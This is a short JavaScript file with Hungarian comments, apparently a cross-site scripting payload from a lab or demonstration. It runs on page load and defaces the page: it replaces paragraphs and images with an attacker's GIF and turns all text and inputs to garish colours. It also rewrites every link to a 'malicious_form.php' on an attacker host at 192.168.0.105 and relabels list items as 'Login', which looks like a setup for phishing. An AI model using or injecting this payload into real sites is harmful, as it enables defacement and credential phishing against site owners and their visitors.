function collapseWebsite() {
  var p = document.getElementsByTagName("p");
  
  //megváltoztatja a bekezdéseket
  for (var i = 0; i < p.length; i++) {
    p[i].style.backgroundColor = "red";
	p[i].style.color = "yellow";
	p[i].innerHTML = "<img src='http://192.168.0.105:8080/xss_attacker/img/himark.gif' alt='támado kepe' width='500px'>";
  }
  
  //kicseréli a képeket
  var img = document.getElementsByTagName("img");
  for (var i = 0; i < img.length; i++) {
	img[i].src = "http://192.168.0.105:8080/xss_attacker/img/himark.gif";
  }
  
  //a linkek forrását megváltoztatja
  var a = document.getElementsByTagName("a");
  for (var i = 0; i < a.length; i++) {
	a[i].href = "http://192.168.0.105:8080/xss_attacker/malicious_form.php";
  }
  
  //átformázza az input mezőket
  var input = document.getElementsByTagName("input");
  for (var i = 0; i < input.length; i++) {
    input[i].style.backgroundColor = "red";
	input[i].style.color = "yellow";
	input[i].value = "KÜLDJ EL! KÜLDJ EL! KÜLDJ EL!";
  }  
  
  //a lista értékeit átírja
  var li = document.getElementsByTagName("li");
  for (var i = 0; i < li.length; i++) {
	li[i].innerHTML = "Bejelentkezés";
  }
  
  //megváltoztatja a szöveg színét
  var div = document.getElementsByTagName("div");
  for (var i = 0; i < div.length; i++) {
	div[i].style.color = "green";
  }  
}

collapseWebsite();
